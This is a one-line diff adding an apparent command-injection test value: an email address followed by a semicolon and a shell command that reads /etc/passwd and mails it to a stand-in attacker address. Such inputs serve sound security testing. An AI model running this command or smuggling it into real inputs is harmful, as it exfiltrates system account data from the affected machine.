@@ -1,0 +1,1 @@
+bogus@addr.com; cat /etc/passwd  | mail some@badguy.net
